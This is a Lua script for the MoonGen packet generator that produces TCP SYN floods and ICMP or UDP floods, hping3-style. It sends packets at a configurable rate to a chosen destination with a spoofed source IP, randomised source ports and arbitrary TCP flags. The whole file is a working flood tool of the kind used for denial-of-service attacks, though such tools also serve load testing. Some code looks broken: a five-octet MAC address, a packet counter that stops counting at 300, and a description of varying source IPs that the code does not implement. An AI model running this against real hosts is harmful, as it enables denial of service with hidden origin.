local mg		= require "moongen"
local memory	= require "memory"
local device	= require "device"
local stats		= require "stats"
local log 		= require "log"

function configure(parser)
	parser:description("Generates TCP SYN flood from varying source IPs, supports both IPv4 and IPv6")
	parser:argument("host", "Destination IP (IPv4 or IPv6).")
	parser:option("-I --interface", "interface name"):default(0):convert(tonumber)
	parser:option("-r --rate", "Transmit rate in Mbit/s."):default(10000):convert(tonumber)
	parser:option("-c --count", "Packet count"):default(10000):convert(tonumber)
	parser:option("-a --spoof", "Spoof source address (IPv4 or IPv6)."):default("10.0.0.1")
	parser:option("-s --baseport", "TCP/UDP source port (default random)"):default(-1):convert(tonumber)
	parser:option("-p --destport", "TCP/UDP destination port"):default(80):convert(tonumber)
	parser:flag("-1 --icmp", "ICMP mode")
	parser:flag("-2 --udp", "UDP mode")

	parser:flag("-L --setack", "Set TCP ack")
	parser:flag("-F --fin", "Set TCP FIN flag")
	parser:flag("-S --syn", "Set TCP SYN flag")
	parser:flag("-R --rst", "Set TCP RST flag")
	parser:flag("-P --push", "Set TCP PUSH flag")
	parser:flag("-A --ack", "Set TCP ACK flag")
	parser:flag("-U --urg", "Set TCP URG flag")
	parser:flag("-X --xmas", "Set TCP X unused flag (0x40)")
	parser:flag("-Y --ymas", "Set TCP Y unused flag (0x80)")
end

function master(args)
	local dev = device.config{port = args.interface}
	local conf = {}
	conf.count = args.count

	dev:wait()
	dev:getTxQueue(0):setRate(args.rate)

	if args.icmp then
		conf.proto = 1
	elseif args.udp then
		conf.proto = 17
	else
		-- TCP was default in Hping3
		conf.proto = 6
	end

	if args.fin then conf.fin = 1 end
	if args.syn then conf.syn = 1 end
	if args.rst then conf.rst = 1 end
	if args.push then conf.push = 1 end
	if args.ack then conf.ack = 1 end
	if args.urg then conf.urg = 1 end
	if args.xmas then conf.xmas = 1 end
	if args.ymas then conf.ymas = 1 end

	mg.startTask("loadSlave", dev:getTxQueue(0), conf, args.spoof, args.host, args.baseport, args.destport)
	mg.waitForTasks()
end

function loadSlave(queue, conf, minA, dest, baseport,  destport)
	--- parse and check ip addresses
	local minIP, ipv4 = parseIPAddress(minA)
	if minIP then
		log:info("Detected an %s address.", minIP and "IPv4" or "IPv6")
	else
		log:fatal("Invalid minIP: %s", minA)
	end
	log:info("Proto %s ", conf.proto)

	if conf.proto == 1 then
	  print ("ICMP mode get ICMP packet, not fully implemented yet")
	-- continue normally
	-- min ICMP packet size
	-- IPv4 is 64 bytes - checked
	-- IPv6 is 74 bytes (+ CRC) - not checked
	local packetLen = ipv4 and 64 or 74
	  local mem = memory.createMemPool(function(buf)
		buf:getIcmpPacket(ipv4):fill{
			ethSrc = queue,
			ethDst = "12:34:56:78:90",
			ip4Dst = dest,
			ip6Dst = dest,
			pktLength = packetLen
		}
	  end)

	  local bufs = mem:bufArray(128)
	  local counter = 0
	  local c = 0

	  local txStats = stats:newDevTxCounter(queue, "plain")
	  while mg.running() do
		  -- fill packets and set their size
		  bufs:alloc(packetLen)
		  for i, buf in ipairs(bufs) do
			local pkt = buf:getIcmpPacket(ipv4)
			if ipv4 then
				pkt.ip4.src:set(minIP)
			else
				pkt.ip6.src:set(minIP)
			end
			-- dump first packets
			if c < 300 then
				buf:dump()
				c = c + 1
			end
			if c == conf.count then
				do return end
			end
	      end

		  --offload checksums to NIC
		  bufs:offloadTcpChecksums(ipv4)

		  queue:send(bufs)
		  txStats:update()
	    end

  elseif conf.proto == 17 then
		print ("UDP mode get UDP packet, not fully implemented yet")
	-- continue normally
	-- min UDP packet size
	-- IPv4 is 64 bytes - not checked
	-- IPv6 is 74 bytes (+ CRC) - not checked
	local packetLen = ipv4 and 60 or 74
	local mem = memory.createMemPool(function(buf)
		buf:getUdpPacket(ipv4):fill{
			ethSrc = queue,
			ethDst = "12:34:56:78:90",
			ip4Dst = dest,
			ip6Dst = dest,
			udpSrc = baseport,
			udpDst = destport,
			pktLength = packetLen
		}
	end)

	local bufs = mem:bufArray(128)
	local c = 0

	local txStats = stats:newDevTxCounter(queue, "plain")
	while mg.running() do
		-- fill packets and set their size
		bufs:alloc(packetLen)
		for i, buf in ipairs(bufs) do
			local pkt = buf:getUdpPacket(ipv4)
			if ipv4 then
				pkt.ip4.src:set(minIP)
			else
				pkt.ip6.src:set(minIP)
			end
			if baseport < 0 then
				pkt.udp:setSrcPort(math.random(65535))
			end
			-- dump first packets
			if c < 300 then
				buf:dump()
				c = c + 1
			end
			if c == conf.count then
				do return end
			end
		end

		--offload checksums to NIC
		bufs:offloadUdpChecksums(ipv4)

		queue:send(bufs)
		txStats:update()
		end

	else
		print ("TCP mode get TCP packet")
	-- min TCP packet size for IPv6 is 74 bytes (+ CRC)
	local packetLen = ipv4 and 60 or 74

	-- continue normally
  local mem = memory.createMemPool(function(buf)
		buf:getTcpPacket(ipv4):fill{
			ethSrc = queue,
			ethDst = "12:34:56:78:90",
			ip4Dst = dest,
			ip6Dst = dest,
			tcpFin = conf.fin,
			tcpSyn = conf.syn,
            tcpRst = conf.rst,
            tcpPsh = conf.push,
            tcpAck = conf.ack,
            tcpUrg = conf.urg,
			tcpSrc = baseport,
			tcpDst = destport,
			tcpSeqNumber = 1,
			tcpWindow = 10,
			pktLength = packetLen
		}
	end)

	local bufs = mem:bufArray(128)
	local counter = 0
	local c = 0

	local txStats = stats:newDevTxCounter(queue, "plain")
	while mg.running() do
		-- fill packets and set their size
		bufs:alloc(packetLen)
		for i, buf in ipairs(bufs) do
			local pkt = buf:getTcpPacket(ipv4)
			if ipv4 then
				pkt.ip4.src:set(minIP)
			else
				pkt.ip6.src:set(minIP)
			end
			if baseport < 0 then
				pkt.tcp:setSrcPort(math.random(65535))
			end
			-- dump first packets
			if c < 300 then
				buf:dump()
				c = c + 1
			end
			if c == conf.count then
				do return end
			end
		end

		--offload checksums to NIC
		bufs:offloadTcpChecksums(ipv4)

		queue:send(bufs)
		txStats:update()
		end
	end
	txStats:finalize()
end
